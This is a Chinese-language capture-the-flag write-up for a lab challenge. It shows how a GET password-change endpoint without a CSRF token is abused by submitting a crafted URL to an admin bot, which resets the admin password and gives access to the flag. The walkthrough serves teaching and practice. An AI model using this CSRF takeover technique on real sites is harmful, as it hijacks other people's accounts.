# 15-csrf-get-passwd

## 1. 题目提示

首页直接给了测试账号：

```text
student / student
```

并提示管理员机器人会定期访问用户提交的 URL，后台在：

```text
/admin
```

题目名是：

```text
csrf-get-passwd
```

所以重点看：

- 是否有 CSRF
- 是否有 GET 改密码接口
- 能否让 admin bot 带着管理员 Cookie 访问这个接口

## 2. 登录 student

浏览器打开：

```text
http://目标地址/login
```

登录：

```text
username=student
password=student
```

登录后可以看到导航里有：

```text
修改密码
提交页面
管理后台
```

## 3. 找到 GET 改密接口

访问：

```text
/change
```

页面提示改密接口是：

```text
GET /change-password?new=新密码
```

例如修改当前登录用户密码：

```text
/change-password?new=ctfpass123
```

问题：

- 用 GET 修改密码
- 不需要旧密码
- 没有 CSRF Token

这就是漏洞点。

## 4. 提交 CSRF 给管理员机器人

访问：

```text
/pages/submit
```

提交 URL：

```text
/change-password?new=ctfpass123
```

管理员机器人是 admin 登录态，它访问这个链接时，请求会变成：

```text
http://127.0.0.1/change-password?new=ctfpass123
```

因为机器人浏览器会自动携带 admin 的 Cookie，所以实际效果是：

```text
admin 的密码被改成 ctfpass123
```

等待大约 15 秒。

## 5. 登录 admin 拿 flag

重新访问登录页：

```text
/login
```

使用：

```text
username=admin
password=ctfpass123
```

登录成功后访问：

```text
/admin
```

即可看到：

```text
TOGOGO-flag{}
```
